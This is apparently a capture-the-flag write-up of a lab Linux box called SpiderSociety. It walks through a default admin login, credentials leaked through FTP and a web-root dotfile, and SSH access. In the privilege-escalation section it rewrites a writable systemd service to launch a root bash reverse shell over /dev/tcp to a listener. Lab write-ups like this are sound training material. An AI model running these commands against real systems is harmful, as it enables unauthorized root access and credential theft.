#Linux #DefaultCreds #FTP #CredentialHunting #Systemd #ServiceHijack #sudo

## Overview

SpiderSociety is a Linux box where a weak admin credential opens a web portal, the portal leaks FTP credentials through an internal communications page, and the FTP server exposes PHP source code containing a path to a hidden credential file. Those credentials SSH straight in as `spidey`, who has write access to a systemd service file and sudo permission to reload and restart it, a clean service hijack to root.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58 (Ubuntu)
2121/tcp open  ftp     vsftpd 3.0.5
```

Three ports: SSH, HTTP on the standard port, and FTP on 2121 (non-standard).

### Web Enumeration

Gobuster against port 80:

```sh
/images     (Status: 301)
/libspider  (Status: 301)
```

`/libspider` is a login panel. Default credentials worked immediately:

```
admin:admin
```

> **Default credentials before exploits.** Any authenticated admin panel warrants a default-credential check before anything else. It costs one request.

The portal has three sections. Communications is the key one, displaying plaintext credentials:

```
Username: ss_ftpbckuser
Password: ss_WeLoveSpiderSociety_From_Tech_Dept5937!
```

## Foothold

### FTP Source Code Disclosure

The FTP credentials connected to port 2121. Among the downloaded files was **fetch-credentials.php**, which contained a hardcoded path to a credential file:

```php
$credentialsFile = __DIR__ . '/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv';
```

The FTP client couldn't open the dotfile directly, but because the path sits alongside the `libspider` web files, fetching it over HTTP worked:

```
http://192.168.114.214/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
```

Contents:

```
FTP_BACKUP_USER=ss_ftpbckuser
FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!

DB_CONNECT_USER=spidey
DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
```

> **Why the obfuscated filename still exposed the secret:** the file was hidden (dotfile prefix) and had a garbled name to defeat guessing, but it lived inside the web root. The FTP download of `fetch-credentials.php` revealed the exact path. Security through obscurity breaks the moment the obscuring layer (the PHP source) is readable. Once you have the path, HTTP serves it like any other static file.

The DB credentials doubled as an SSH login:

```sh
ssh spidey@192.168.114.214
spidey@spidersociety:~$ whoami
spidey
```

## Privilege Escalation

### Writable Systemd Service + sudo Reload

LinPEAS identified a writable service file:

```
You have write privileges over /etc/systemd/system/spiderbackup.service
```

`sudo -l` confirmed the escalation path:

```sh
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart spiderbackup.service
```

I edited the service file to replace its `ExecStart` with a bash reverse shell:

```ini
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.172/443 0>&1'
User=root
Group=root
```

Then reloaded and restarted:

```sh
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart spiderbackup.service
```

Shell caught:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.172] from (UNKNOWN) [192.168.114.214] 56084
root@spidersociety:/# whoami
root
```

> **Why this works:** systemd runs services as the user specified in the `User=` field. With `User=root` and the service definition under our control, systemd executes our `ExecStart` as root. The `daemon-reload` is necessary to pick up the modified unit file before restart, and both commands were in our sudo list without a password.

## Root

```sh
root@spidersociety:/# cat /root/proof.txt
‹redacted›
```

## Takeaways

- **Web portals protect themselves only as well as their default credentials.** `admin:admin` opened everything here.
- **Source code fetched over FTP reveals file paths; those paths are still reachable over HTTP if the file lives in the web root.** The obfuscated dotfile name was irrelevant once the PHP source gave away its exact path.
- **Write access to a systemd unit file plus sudo permission to restart it equals root**, regardless of what the original service did.
